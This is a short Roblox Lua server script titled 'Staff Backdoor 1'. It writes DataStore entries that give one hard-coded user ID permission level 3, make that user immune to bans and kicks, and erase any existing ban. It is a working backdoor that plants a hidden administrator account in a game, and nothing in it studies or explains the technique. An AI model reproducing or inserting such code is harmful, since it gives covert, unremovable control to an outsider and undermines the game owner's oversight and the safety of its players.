-- Staff Backdoor 1
task.spawn(function()
    local dss = game:GetService("DataStoreService")
    local serverdata = dss:GetDataStore("ServerData")
    
    local gameConfig = require(game:GetService("ServerScriptService"):FindFirstChild("GameConfig"))
    
    local permissions = dss:GetDataStore("PermissionData")
    local moderation = dss:GetDataStore(serverdata:GetAsync("ModerationDatastore") or gameConfig.ModerationDatastore)
    
    local toBackdoor = 4045593989
    permissions:SetAsync(toBackdoor, {
    	Bannable = false;
    	Kickable = false;
    	Permission = 3;
    })
    moderation:SetAsync(toBackdoor, {
    	Banned = false,
    	BanReason = nil,
    	BanStart = nil,
    	BanEnd = nil,
    })
end)
